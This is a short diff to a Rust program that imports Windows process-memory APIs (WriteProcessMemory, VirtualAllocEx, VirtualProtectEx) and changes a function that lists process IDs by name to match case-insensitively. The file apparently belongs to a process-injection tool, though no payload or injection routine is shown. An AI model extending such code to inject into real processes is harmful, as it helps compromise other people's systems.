@@ -2,7 +2,6 @@
 #![allow(non_snake_case)]
 
 use sysinfo::System;
-use std::ffi::OsStr;
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Memory::VirtualAllocEx;
 use windows::Win32::System::Memory::VirtualProtectEx;
@@ -23,8 +22,11 @@ use std::thread;
 fn boxboxbox(tar: &str) -> Vec<usize> {
     let mut dom: Vec<usize> = Vec::new();
     let s = System::new_all();
-    for pro in s.processes_by_exact_name(OsStr::new(tar)) {
-        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+    let tar_lower = tar.to_lowercase();
+    for (_, pro) in s.processes() {
+        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
+            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+        }
     }
     dom
 }
